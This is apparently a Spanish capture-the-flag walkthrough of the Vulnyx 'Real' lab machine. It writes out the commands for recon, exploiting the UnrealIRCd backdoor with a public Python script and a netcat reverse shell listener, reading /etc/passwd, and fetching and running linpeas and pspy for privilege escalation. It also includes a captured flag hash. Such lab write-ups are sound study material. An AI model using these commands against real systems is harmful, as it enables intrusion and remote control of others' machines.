#Reconocimiento
#Puerto80
#puerto6667
#reverseshell
#reverseshellpython
#escaladaPrivilegios

Herramients
[[ping]]
[[NMAP]]
[[Gobuster]]
[[Tratamiento de la TTY]]

Mirror donwload: [Download - MEGA](https://mega.nz/file/FOZxHbKB#LLYTQBQLGLYTVdlMMJ27mLc23pGN0XjFlg4vgHvh5Qw)

![[Vulnyx - Real - Machine.png]]
## Reconocimiento en la red

![[Vulnyx - Real - Reconocimiento.png]]

IP Máquina  target: 192.168.1.140
## NMAP

![[Vulnyx - Real - Nmap discover.png]]
Obtenemos que el epuerto 80 y puerto 22 esán abiertos
Puerto 80 es el puerto para servicio web
Puerto 22 es el puerto de SSH
Puerto 6667  --irc
Puerto 6697  --irc-u
Puerto 8067  --infi-async

Vemos la web que encontramos:

## revision puerto 80


![[Vulnyx - Real - Apache 2 Debian default website.png]]
Web es la web de apache 2 por defecto
Hacemos Gobuster para intentar encontrar  diferentes rutas de la web (por si existe algo fuera del index)


![[Vulnyx - Real - Goobuster.png]]
Pero no encontramos nada
podemos seguir intentando fuzz y gobuster subdomains

De la web no sacamos nada
Pasamos al siguiente puerto 6667

 instantamos explotarlo con metaexploit:
 comandos 
 msfconsole
![[Vulnyx - Real - Msfconsole.png]]

y buscando un poco por internet vemos que es vulnerable con metaexploit: 
https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/
vamos a intentar explotarlo segun lo encontrado

![[Vulnyx - Real - Search Unreal.png]]


Use 2
![[Vulnyx - Real - Use2 msfconsole.png]]

Options
![[Vulnyx - Real - Options.png]]

set rhost = IP:
![[Vulnyx - Real - Set rhost.png]]

set rport  6667

![[Vulnyx - Real - Set report 6667.png]]

use exploit/unix/irc/unreal_ircd_3281_backdoor
![[Vulnyx - Real - Use exploit irc unreal.png]]

show payloads:
![[Vulnyx - Real - show payloads.png]]

set payload reverse:
![[Vulnyx - Real - Set pauload reverse.png]]

set lhosts = local IP:
![[Vulnyx - Real - Set lhost.png]]


exploit
![[Vulnyx - Real - Exploit.png]]
but No sessions was created.

Buscando un poco por internet encontramos el repo de github

https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor

descargamos el exploit .py
wget https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/blob/master/exploit.py

![[Vulnyx - Real - Descargar exploit del repo de github.png]]

Editamos el script en python para poner nuestra IP y el puerto con el que vamos a hacer el reverse proxy:
![[Vulnyx - Real - Script original.png]]


modificamos segun nuestras preferencias:
![[Vulnyx - Real - Config parameter.png]]

en este caso nuestra IP local y el puerto por el cual nos vamos a poner a la escucha que va a ser el 6666

ahora nos ponemos a la escucha en la terminal con  el comando:
nc -lvp 6666

![[Vulnyx - Real - Reverse shell en escucha.png]]

y una vez estamos escuchando por el puerto correcto lo que hacemos es ejecutar el scrip de python para conectar por el puerto 6667 y lanzar una reverse shell sobre nuestra IP por el puerto 6666
python3 exploit.py 192.168.1.140 6667 -payload netcat

![[Vulnyx - Real - Send exploit.png]]

y en la terminal que estamos a la escucha por el puerto 6666 recibimos la conexión:

![[Vulnyx - Real - Connection reverse proxy.png]]

Entramos con el usuario serve
![[Vulnyx - Real - Acceso con user serve vulnix real.png]]


intentamos movernos hasta home/serve  para ver si está la flag del usuario
y conseguimos la primera flag del usuario:
![[Vulnyx - Real - User server flag.png]]
user server flag: 3b7fb7c1c8737a5c67dc513657e3efb3


Comando id
![[Vulnyx - Real - Comando id para ver el usuario.png]]
Con el comando id vemos que el usuario es server 

vemos el passwd en /etc/passwd:
![[Vulnyx - Real - Passwd.png]]

server:x:1000:1000:server,,,:/home/server:/bin/bash
aquí vemos que el id de usuario es 1000 e identificador de grupo es 1000 --> Todos los que comienzan con 1000 en LINUX son usuarios

ahora vamos a hacer tratamiento de la TTI:


Tratamiento de la TTI
script /dev/null -c bash
CTRL + Z
stti raw -echo ; fg
reset
xterm
export TERM = xterm-256color
export SHELL = bash
stty -a

Descargamos linpeas:

https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/README.md
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

le damos permisos de ejecucion al fichero .sh
chmod +x linpeas.sh
ejecutamos linpeas
./linpeas.sh

![[Vulnyx - Real - Linpeas.png]]

Pero no encontramos nada interesante

Usamos la herramient pspy:
https://github.com/DominicBreuker/pspy
url de descarga:
https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64

le damos permisos de ejecucion
chmod +x pspy64

lo ejecutamos
./pspy64
![[Vulnyx - Real - Pspy64.png]]

nos encontramos un fichero que se ejecuta como admisnitrador en /opt/Task
vemos ese fichero:
cat /opt/Task

